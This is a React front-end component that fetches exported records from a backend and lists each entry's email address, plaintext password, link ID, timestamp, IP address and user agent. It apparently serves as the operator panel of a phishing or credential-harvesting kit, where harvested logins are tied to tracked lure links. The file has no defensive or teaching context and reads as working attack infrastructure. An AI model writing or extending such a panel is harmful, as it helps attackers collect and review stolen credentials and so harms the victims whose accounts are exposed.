import React, { useEffect, useState } from "react";

const SubmissionsTable = () => {
  const [rows, setRows] = useState([]);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    fetch(`${process.env.REACT_APP_BACKEND_URL}/data/export`)
      .then((r) => r.json())
      .then(setRows)
      .catch((e) => console.error("export error:", e))
      .finally(() => setLoading(false));
  }, []);

  if (loading) return <div>Loading…</div>;

  const fmt = (iso) => {
    const d = new Date(iso);
    return isNaN(d) ? "-" : d.toLocaleString();
  };

  return (
    <div className="table-container">
      <table>
        <thead>
          <tr>
            <th>ID</th>
            <th>Link&nbsp;ID</th>
            <th>Email</th>
            <th>Password</th>
            <th>Timestamp</th>
            <th>IP&nbsp;Address</th>
            <th>User&nbsp;Agent</th>
          </tr>
        </thead>
        <tbody>
          {rows.map((r) => (
            <tr key={r.id}>
              <td>{r.id}</td>
              <td>{r.link_id}</td>
              <td>{r.email}</td>
              <td>{r.password}</td>
              <td>{fmt(r.timestamp)}</td>
              <td>{r.ip_address || "-"}</td>
              <td style={{ maxWidth: 320, wordBreak: "break-all" }}>
                {r.user_agent || "-"}
              </td>
            </tr>
          ))}
        </tbody>
      </table>
    </div>
  );
};

export default SubmissionsTable;
